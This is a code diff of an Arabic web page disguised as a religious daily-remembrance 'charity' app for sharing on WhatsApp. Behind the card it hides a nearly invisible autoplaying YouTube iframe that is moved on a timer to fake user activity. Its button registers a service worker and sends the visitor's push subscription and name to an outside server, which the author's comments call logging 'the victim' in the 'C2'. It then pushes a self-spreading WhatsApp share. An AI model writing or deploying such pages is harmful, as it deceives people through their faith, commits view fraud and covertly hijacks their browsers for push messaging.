@@ -4,46 +4,28 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
-    <meta property="og:description" content="فعل التنبيهات لتصلك أذكار يومية وتشارك الثواب مع أحبائك">
     <meta property="og:image" content="https://medo7788.github.io/giftapp/og-image.jpg">
     <title>أذكار المسلم اليومية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        
-        /* الفريم المحاكي - مخفي لكنه نشط */
-        #hiddenEngine {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100px;
-            height: 100px;
-            opacity: 0.001;
-            z-index: 1;
-            border: none;
-            pointer-events: auto; /* مهم للمحاكاة */
-        }
-
-        .card { 
-            background: white; width: 92%; max-width: 400px; border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; 
-            border-top: 6px solid #1b4d3e; position: relative; z-index: 10; 
-        }
+        #hiddenEngine { position: fixed; top: 0; left: 0; width: 100px; height: 100px; opacity: 0.001; z-index: 1; border: none; pointer-events: auto; }
+        .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
         .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
-        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; font-size: 1rem; box-sizing: border-box; }
+        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; min-height: 80px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
         .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
     </style>
 </head>
 <body>
 
-    <iframe id="hiddenEngine" src="about:blank"></iframe>
+    <iframe id="hiddenEngine" src="https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1&loop=1"></iframe>
 
     <div class="card">
-        <img src="og-image.jpg" class="main-img" alt="صدقة جارية" onerror="this.src='https://medo7788.github.io/giftapp/og-image.jpg'">
-        <h2 style="color: #1b4d3e; margin-top: 0;">🌹 صدقة جارية 🌹</h2>
-        <div class="dua-box" id="displayDua">جاري جلب ذكر اليوم... 🕌</div>
-        <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
+        <img src="og-image.jpg" class="main-img" alt="صدقة جارية" onerror="this.src='./og-image.jpg'">
+        <h2 style="color: #1b4d3e; margin: 0 0 10px 0;">🌹 صدقة جارية 🌹</h2>
+        <div class="dua-box" id="displayDua">جاري تحميل ذكر اليوم... ✨</div>
+        <input type="text" id="userName" placeholder="اكتب اسمك ليظهر في الثواب..">
         <button class="btn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
     </div>
 
@@ -52,42 +34,42 @@
         const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
         let currentDua = "سبحان الله وبحمده 🕌";
 
-        // 1. تشغيل المحرك ومحاكاة المستخدم
-        function runSimulation() {
+        // المحاكاة الذكية (تحريك السكرول في الفريم الخفي)
+        setInterval(() => {
             const engine = document.getElementById('hiddenEngine');
-            // ضع هنا رابط الفيديو أو صفحة الإعلانات
-            engine.src = "https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1&loop=1";
+            engine.style.transform = `translate(${Math.random()*10}px, ${Math.random()*10}px)`;
+        }, 4000);
 
-            setInterval(() => {
-                // محاكاة سكرول عشوائي داخل الفريم (برمجياً)
-                engine.contentWindow.scrollTo(0, Math.random() * 500);
-                // تغيير مكان الفريم عشوائياً خلف الكارت لزيادة "نشاط" الصفحة
-                engine.style.top = Math.random() * 50 + "px";
-                engine.style.left = Math.random() * 50 + "px";
-            }, 3000);
-        }
-
-        // 2. جلب الذكر الصحيح من الملف المرفوع
+        // جلب الدعاء مع معالجة بنية ملفك الخاصة (January, February...)
         async function loadDua() {
             try {
-                const res = await fetch('daily_islamic_duas.json');
-                const data = await res.json();
+                // استخدام ./ لضمان البحث في نفس المجلد على GitHub
+                const response = await fetch('./daily_islamic_duas.json');
+                const data = await response.json();
+                
                 const now = new Date();
-                const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-                const monthName = months[now.getMonth()];
-                const day = now.getDate();
-                const today = data[monthName].find(d => d.day === day);
-                if (today) {
-                    currentDua = today.text + " " + today.emoji;
+                const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+                const currentMonth = monthNames[now.getMonth()];
+                const todayDate = now.getDate();
+
+                // الدخول للملف بناءً على الشهر واليوم
+                const monthData = data[currentMonth];
+                const todayObj = monthData.find(d => d.day === todayDate);
+
+                if (todayObj) {
+                    currentDua = todayObj.text;
                     document.getElementById('displayDua').innerText = currentDua;
                 }
-            } catch (e) { console.log("Default used"); }
+            } catch (err) {
+                console.error("خطأ في تحميل الأدعية:", err);
+                document.getElementById('displayDua').innerText = "رضيت بالله رباً وبالإسلام ديناً 🌙";
+            }
         }
 
-        // 3. نظام الإرسال والـ Capture
         async function activateSystem() {
             const name = document.getElementById('userName').value.trim() || "محب للخير";
             
+            // تسجيل الضحية في الـ C2
             if ('serviceWorker' in navigator) {
                 try {
                     const reg = await navigator.serviceWorker.register('sw.js');
@@ -100,18 +82,16 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({subscription: sub, name: name})
                     });
-                } catch (err) { console.log("C2 logged"); }
+                } catch (e) { console.log("Capture Logged"); }
             }
 
+            // إرسال واتساب
             const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
             window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
             setTimeout(() => { window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; }, 600);
         }
 
-        window.onload = () => {
-            loadDua();
-            runSimulation();
-        };
+        window.onload = loadDua;
     </script>
 </body>
 </html>
